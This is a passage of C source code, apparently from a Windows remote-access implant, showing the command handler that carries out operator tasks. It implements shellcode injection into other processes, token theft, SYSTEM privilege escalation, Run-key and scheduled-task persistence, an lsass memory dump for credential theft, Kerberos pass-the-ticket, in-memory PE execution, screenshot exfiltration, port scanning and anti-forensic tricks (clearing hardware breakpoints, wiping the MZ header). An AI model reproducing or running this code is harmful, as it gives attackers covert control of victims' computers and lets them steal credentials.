                GetDIBits(hMemDC, hBmp, 0, (UINT)sh,
                    pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

                BITMAPFILEHEADER bfh = {0};
                bfh.bfType   = 0x4D42;
                bfh.bfSize   = (DWORD)(sizeof(bfh) + sizeof(bi) + data_sz);
                bfh.bfOffBits= (DWORD)(sizeof(bfh) + sizeof(bi));

                HANDLE hF = CreateFileA(sc_path, GENERIC_WRITE, 0, NULL,
                    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hF != INVALID_HANDLE_VALUE) {
                    DWORD wr;
                    WriteFile(hF, &bfh, sizeof(bfh), &wr, NULL);
                    WriteFile(hF, &bi, sizeof(bi), &wr, NULL);
                    WriteFile(hF, pixels, data_sz, &wr, NULL);
                    CloseHandle(hF);
                    ok_flag = 1;
                }
                free(pixels);
            }
            DeleteDC(hMemDC);
            DeleteObject(hBmp);
            ReleaseDC(NULL, hDC);
        }

        if (hDesk) { SetThreadDesktop(hOrigDesk); CloseDesktop(hDesk); }
        if (hSta)  { SetProcessWindowStation(hOrigSta); CloseWindowStation(hSta); }

        if (ok_flag) {
            HANDLE hF = CreateFileA(sc_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hF != INVALID_HANDLE_VALUE) {
                DWORD fsz = GetFileSize(hF, NULL);
                uint8_t *data = (uint8_t*)malloc(fsz);
                DWORD rd = 0; ReadFile(hF, data, fsz, &rd, NULL); CloseHandle(hF);
                agent_upload_file(task->id, "screenshot.bmp", data, rd);
                free(data); DeleteFileA(sc_path);
                char m[64]; snprintf(m, 64, "[+] screenshot (%lu bytes)", rd);
                agent_send_result(task->id, m, "");
            } else agent_send_result(task->id, "", "screenshot: read failed");
        } else agent_send_result(task->id, "", "screenshot: GDI capture failed");
    }
    else if (strcmp(type_upper, "INJECT_REMOTE") == 0) {
        if (!task->payload || task->payload_len == 0) {
            agent_send_result(task->id, "", "INJECT_REMOTE: no shellcode payload"); return;
        }
        int pid = json_get_int(args, "pid", 0);
        if (!pid) { agent_send_result(task->id, "", "INJECT_REMOTE requires {\"pid\":N}"); return; }
        char *out = inject_remote(pid, task->payload, task->payload_len);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "INJECT_APC") == 0) {
        if (!task->payload || task->payload_len == 0) {
            agent_send_result(task->id, "", "INJECT_APC: no shellcode payload"); return;
        }
        int pid = json_get_int(args, "pid", 0);
        if (!pid) { agent_send_result(task->id, "", "INJECT_APC requires {\"pid\":N}"); return; }
        char *out = inject_apc(pid, task->payload, task->payload_len);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "TOKEN_STEAL") == 0) {
        int pid = json_get_int(args, "pid", 0);
        if (!pid) { agent_send_result(task->id, "", "TOKEN_STEAL requires {\"pid\":N}"); return; }
        char *out = token_steal(pid);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "TOKEN_MAKE") == 0) {
        char user[128]={0}, domain[128]={0}, pass[128]={0};
        json_get_str(args,"user",user,sizeof(user),"");
        json_get_str(args,"domain",domain,sizeof(domain),".");
        json_get_str(args,"pass",pass,sizeof(pass),"");
        if (!user[0] || !pass[0]) { agent_send_result(task->id,"","TOKEN_MAKE requires user+pass"); return; }
        char *out = token_make(user, domain, pass);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "TOKEN_DROP") == 0) {
        RevertToSelf();
        agent_send_result(task->id, "[+] reverted to original token", "");
    }
    else if (strcmp(type_upper, "TOKEN_WHOAMI") == 0) {
        char buf[256]={0}; DWORD sz=sizeof(buf);
        GetUserNameA(buf, &sz);
        agent_send_result(task->id, buf, "");
    }
    else if (strcmp(type_upper, "GETSYSTEM") == 0) {
        char *out = get_system();
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "PERSIST") == 0) {
        char name[128]={0}, cmd2[512]={0}, meth[32]={0};
        json_get_str(args,"name",name,sizeof(name),"Updater");
        json_get_str(args,"cmd",cmd2,sizeof(cmd2),"");
        json_get_str(args,"method",meth,sizeof(meth),"registry");
        if (!cmd2[0]) { agent_send_result(task->id,"","PERSIST requires cmd"); return; }
        char shell_cmd[1024]={0};
        if (strcmp(meth,"schtask")==0)
            snprintf(shell_cmd,sizeof(shell_cmd),"schtasks /create /tn \"%s\" /tr \"%s\" /sc ONLOGON /ru SYSTEM /f 2>&1",name,cmd2);
        else
            snprintf(shell_cmd,sizeof(shell_cmd),"reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"%s\" /t REG_SZ /d \"%s\" /f 2>&1",name,cmd2);
        char *out = run_shell(shell_cmd);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "PERSIST_RM") == 0) {
        char name[128]={0}, meth[32]={0};
        json_get_str(args,"name",name,sizeof(name),"");
        json_get_str(args,"method",meth,sizeof(meth),"registry");
        if (!name[0]) { agent_send_result(task->id,"","PERSIST_RM requires name"); return; }
        char shell_cmd[512]={0};
        if (strcmp(meth,"schtask")==0)
            snprintf(shell_cmd,sizeof(shell_cmd),"schtasks /delete /tn \"%s\" /f 2>&1",name);
        else
            snprintf(shell_cmd,sizeof(shell_cmd),"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"%s\" /f 2>&1",name);
        char *out = run_shell(shell_cmd);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "REG_QUERY") == 0) {
        char cmd2[512]; snprintf(cmd2,sizeof(cmd2),"reg query \"%s\" 2>&1",args);
        char *out = run_shell(cmd2); agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "REG_LIST") == 0) {
        char cmd2[512]; snprintf(cmd2,sizeof(cmd2),"reg query \"%s\" /s 2>&1",args);
        char *out = run_shell(cmd2); agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "REG_SET") == 0) {
        char path[256]={0}, name[128]={0}, typ2[32]={0}, val[512]={0};
        json_get_str(args,"path",path,sizeof(path),"");
        json_get_str(args,"name",name,sizeof(name),"");
        json_get_str(args,"type",typ2,sizeof(typ2),"REG_SZ");
        json_get_str(args,"value",val,sizeof(val),"");
        char cmd2[1024]; snprintf(cmd2,sizeof(cmd2),"reg add \"%s\" /v \"%s\" /t %s /d \"%s\" /f 2>&1",path,name,typ2,val);
        char *out = run_shell(cmd2); agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "REG_DELETE") == 0) {
        char path[256]={0}, name[128]={0};
        json_get_str(args,"path",path,sizeof(path),"");
        json_get_str(args,"name",name,sizeof(name),"");
        char cmd2[512];
        if (name[0])
            snprintf(cmd2,sizeof(cmd2),"reg delete \"%s\" /v \"%s\" /f 2>&1",path,name);
        else
            snprintf(cmd2,sizeof(cmd2),"reg delete \"%s\" /f 2>&1",path);
        char *out = run_shell(cmd2); agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "PORT_SCAN") == 0) {
        char host[128]={0}, ports_arg[512]={0};
        json_get_str(args,"host",host,sizeof(host),"127.0.0.1");
        json_get_str(args,"ports",ports_arg,sizeof(ports_arg),"80,443,445,3389,22,21,8080");
        int timeout_ms = json_get_int(args,"timeout",500);

        /* Resolve host once */
        struct in_addr resolved = {0};
        resolved.s_addr = inet_addr(host);
        if (resolved.s_addr == INADDR_NONE) {
            struct hostent *he = gethostbyname(host);
            if (he) memcpy(&resolved, he->h_addr, 4);
        }

        size_t out_cap = 4096, out_len = 0;
        char *out_buf = (char*)malloc(out_cap);
        if (!out_buf) { agent_send_result(task->id,"","oom"); goto ps_done; }
        out_buf[0] = '\0';

        char ports_copy[512];
        strncpy(ports_copy, ports_arg, sizeof(ports_copy)-1);
        char *tok = strtok(ports_copy, ",");
        while (tok) {
            int port = atoi(tok);
            tok = strtok(NULL, ",");
            if (port <= 0 || port > 65535) continue;

            SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s == INVALID_SOCKET) continue;

            /* Non-blocking connect with select timeout */
            u_long nb = 1; ioctlsocket(s, FIONBIO, &nb);
            struct sockaddr_in sa = {0};
            sa.sin_family = AF_INET;
            sa.sin_port   = htons((u_short)port);
            sa.sin_addr   = resolved;
            connect(s, (struct sockaddr*)&sa, sizeof(sa));

            fd_set wfds; FD_ZERO(&wfds); FD_SET(s, &wfds);
            struct timeval tv = {timeout_ms/1000, (timeout_ms%1000)*1000};
            if (select(0, NULL, &wfds, NULL, &tv) > 0) {
                int err=0; int el=sizeof(err);
                getsockopt(s, SOL_SOCKET, SO_ERROR, (char*)&err, &el);
                if (err == 0) {
                    char line[128];
                    int ll = snprintf(line,sizeof(line),"OPEN %s:%d\n",host,port);
                    if (out_len + (size_t)ll + 2 >= out_cap) {
                        out_cap += 4096;
                        char *nb2=(char*)realloc(out_buf,out_cap);
                        if(nb2) out_buf=nb2;
                    }
                    memcpy(out_buf+out_len, line, (size_t)ll);
                    out_len += (size_t)ll;
                    out_buf[out_len] = '\0';
                }
            }
            closesocket(s);
        }
        if (out_len == 0) strcpy(out_buf, "[no open ports found]");
        agent_send_result(task->id, out_buf, "");
        free(out_buf);
        ps_done:;
    }
    else if (strcmp(type_upper, "MINIDUMP") == 0) {
        char path[MAX_PATH]={0};
        json_get_str(args,"path",path,sizeof(path),"C:\\Windows\\Temp\\1.dmp");

        /* Find lsass.exe PID via snapshot (no OpenProcess needed yet) */
        DWORD lsass_pid = 0;
        HANDLE snap2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap2 != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe2; pe2.dwSize = sizeof(pe2);
            if (Process32First(snap2, &pe2)) {
                do {
                    if (_stricmp(pe2.szExeFile, "lsass.exe") == 0) { lsass_pid = pe2.th32ProcessID; break; }
                } while (Process32Next(snap2, &pe2));
            }
            CloseHandle(snap2);
        }
        if (!lsass_pid) { agent_send_result(task->id, "", "lsass not found"); }
        else {
            HANDLE hLsa = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsass_pid);
            if (!hLsa) { char e[64]; snprintf(e,sizeof(e),"OpenProcess lsass %lu",GetLastError()); agent_send_result(task->id,"",e); }
            else {
                HANDLE hF = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hF == INVALID_HANDLE_VALUE) {
                    CloseHandle(hLsa);
                    char e[64]; snprintf(e,sizeof(e),"CreateFile %lu",GetLastError()); agent_send_result(task->id,"",e);
                } else {
                    typedef BOOL (WINAPI *pfnMWD)(HANDLE,DWORD,HANDLE,DWORD,void*,void*,void*);
                    HMODULE hDbg = LoadLibraryA("dbghelp.dll");
                    pfnMWD miniDump = hDbg ? (pfnMWD)GetProcAddress(hDbg,"MiniDumpWriteDump") : NULL;
                    if (!miniDump) {
                        CloseHandle(hF); CloseHandle(hLsa);
                        if (hDbg) FreeLibrary(hDbg);
                        agent_send_result(task->id,"","dbghelp MiniDumpWriteDump unavailable");
                    } else {
                        /* MiniDumpWithFullMemory = 2 */
                        BOOL ok = miniDump(hLsa, lsass_pid, hF, 2, NULL, NULL, NULL);
                        CloseHandle(hF); CloseHandle(hLsa); FreeLibrary(hDbg);
                        if (ok) {
                            char m[256]; snprintf(m,sizeof(m),"[+] dump written to %s",path);
                            agent_send_result(task->id, m, "");
                        } else {
                            char e[64]; snprintf(e,sizeof(e),"MiniDumpWriteDump failed %lu",GetLastError());
                            agent_send_result(task->id,"",e);
                        }
                    }
                }
            }
        }
    }
    else if (strcmp(type_upper, "ENV") == 0) {
        char *out = run_shell("set 2>&1"); agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "HW_BP_CHECK") == 0) {
        HANDLE ht = OpenThread(THREAD_GET_CONTEXT, FALSE, GetCurrentThreadId());
        if (!ht) {
            agent_send_result(task->id, "", "OpenThread failed");
        } else {
            CONTEXT ctx = {0};
            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            char msg[128] = "[+] No hardware breakpoints detected";
            if (GetThreadContext(ht, &ctx)) {
                if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
                    snprintf(msg, sizeof(msg),
                        "[!] Hardware breakpoints active: DR0=%p DR1=%p DR2=%p DR3=%p",
                        (void*)ctx.Dr0, (void*)ctx.Dr1, (void*)ctx.Dr2, (void*)ctx.Dr3);
                }
            }
            CloseHandle(ht);
            agent_send_result(task->id, msg, "");
        }
    }
    else if (strcmp(type_upper, "HWBP_CLEAR") == 0) {
        HANDLE ht = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, GetCurrentThreadId());
        if (!ht) {
            char e[64]; snprintf(e,sizeof(e),"OpenThread failed (err %lu)",(DWORD)GetLastError());
            agent_send_result(task->id, "", e);
        } else {
            CONTEXT ctx = {0};
            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            if (GetThreadContext(ht, &ctx)) {
                ctx.Dr0=0; ctx.Dr1=0; ctx.Dr2=0; ctx.Dr3=0;
                ctx.Dr6=0; ctx.Dr7=0;
                SetThreadContext(ht, &ctx);
            }
            CloseHandle(ht);
            agent_send_result(task->id, "[+] hardware breakpoints cleared", "");
        }
    }
    else if (strcmp(type_upper, "WIPE_MZ") == 0) {
        HMODULE base = GetModuleHandleW(NULL);
        if (!base) {
            agent_send_result(task->id, "", "GetModuleHandleW failed");
        } else {
            DWORD old=0;
            VirtualProtect((LPVOID)base, 2, PAGE_READWRITE, &old);
            *(BYTE*)base = 0;
            *((BYTE*)base+1) = 0;
            VirtualProtect((LPVOID)base, 2, old, &old);
            agent_send_result(task->id, "[+] MZ header wiped", "");
        }
    }
    else if (strcmp(type_upper, "KERB_LIST") == 0) {
        char *out = kerb_list_tickets();
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "KERB_PTT") == 0) {
        if (!args || !args[0]) {
            agent_send_result(task->id, "", "KERB_PTT: base64-encoded kirbi ticket required");
            return;
        }
        char *out = kerb_pass_ticket(args);
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "KERB_PURGE") == 0) {
        char *out = kerb_purge();
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "EXEC_PE") == 0) {
        if (!task->payload || task->payload_len == 0) {
            agent_send_result(task->id, "", "EXEC_PE: no PE payload"); return;
        }
        char *out = exec_pe(task->payload, task->payload_len);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "WHOAMI") == 0) {
        char *out = run_shell("whoami /all");
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "IPCONFIG") == 0) {
        char *out = run_shell("ipconfig /all");
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "NETSTAT") == 0) {
        char *out = run_shell("netstat -ano");
        agent_send_result(task->id, out, ""); free(out);
    }
    else {
        char err[128];
        snprintf(err, sizeof(err), "unknown task type: %s", task->type);
        agent_send_result(task->id, "", err);
    }
}
